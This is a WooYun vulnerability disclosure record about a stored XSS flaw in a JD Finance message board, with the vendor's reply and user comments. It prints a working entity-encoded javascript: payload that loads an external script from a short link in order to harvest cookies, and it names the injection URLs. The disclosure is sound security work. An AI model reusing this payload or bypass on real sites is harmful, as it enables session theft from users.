{"id": 73625, "wybug_id": "wooyun-2016-0167176", "wybug_title": "京东金融某处存储XSS跨站可提取Cookies", "wybug_corp": "京东金融", "wybug_author": "Power", "wybug_date": "2016-01-04 14:26", "wybug_open_date": "2016-01-06 09:47", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-06：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 没描述清楚？非自X 详细说明：  测试了下留言板处，发现存储XSS,因未过滤\"<\",\">\"及p,a,img标签,及javascript:伪协议，综合到一起形成存储型XSS 但是明文插入式不可以的，需要修改编码,服务器端规则过滤了\"&#***;\"这种形式的，实体编码，但是当使用\"&#***\"最后没有分号也可以，例如\"&#0000106\"浏览器也能够进行html解码，并且京东将大部分事件都过滤了,所以只能使用javascript:下面是详细过程 插入点: http://club.jr.jd.com/topic/618751&orderBy=*&pageNo=* 留言板处插入如下代码 插入的源代码是这样 \n<a href=javascript:document.write('<script src=***></script>')>\n 源代码经过编码之后是这样,这里自己写了个半自动化脚本进行编码，编码后插入语句是这样的 \n</p> 111 <a href=javascript:&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000100&#0000111&#0000099&#0000117&#0000109&#0000101&#0000110&#0000116&#0000046&#0000119&#0000114&#0000105&#0000116&#0000101&#0000040&#0000039&#0000060&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000032&#0000115&#0000114&#0000099&#0000061&#0000104&#0000116&#0000116&#0000112&#0000058&#0000047&#0000047&#0000116&#0000046&#0000099&#0000110&#0000047&#0000082&#0000052&#0000073&#0000067&#0000097&#0000090&#0000066&#0000062&#0000060&#0000047&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000062&#0000039&#0000041> <p>\n 代码插入的地址如下http://club.jr.jd.com/topic/619467&orderBy=1&pageNo=3插入效果如下\n\n 但是这段代码貌似只能在IE6中触发(IE6测试成功) 平台收cookie \n\n   漏洞证明：  http://club.jr.jd.com/topic/619467&orderBy=1&pageNo=3\n\n   修复方案：     版权声明：转载请注明来源 Power@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2016-01-05 11:14 厂商回复： 此问题已内部发现，已在修复中。感谢关注京东金融安全 最新状态： 2016-01-06：已修复  ", "replys": "漏洞评价：\n评价\n     2016-01-06 10:19 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:24        | 丫的，别看我还没转正，就欺负我！)\t\t \n  你确认修复了？ 真逗,你们都没明白 啥原理    \n     2016-01-11 09:53 |    \t\tmax_kun \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 求个xss平台有的私密我啊)\t\t \n  rank 难道不是凭技术 + 危害 分的的吗 ？ 一个弱密码都能3rank这个才1rank 什么意思？    \n     2016-01-13 08:33 |    \t\ttangtanglove \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 一个对安全感兴趣的屌丝php程序员)\t\t \n  @max_kun 我提交的也只给了2rank    \n     2016-01-26 16:03 |    \t\t晨曦遇晓 \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:40        | 从明天起，不装逼。)\t\t \n  高端分析，低端rank，感觉不会在爱了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}